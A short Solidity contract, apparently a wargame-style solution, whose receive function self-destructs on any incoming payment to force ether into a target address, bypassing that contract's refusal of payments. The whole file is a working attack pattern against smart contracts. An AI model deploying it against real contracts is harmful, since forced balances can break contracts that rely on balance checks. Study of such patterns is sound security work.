// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address public attackAddress;

    constructor(address _address) {
        attackAddress = _address;
    }

    receive() external payable {
        if (msg.value > 0) {
            selfdestruct(payable(attackAddress));
        }
    }
}
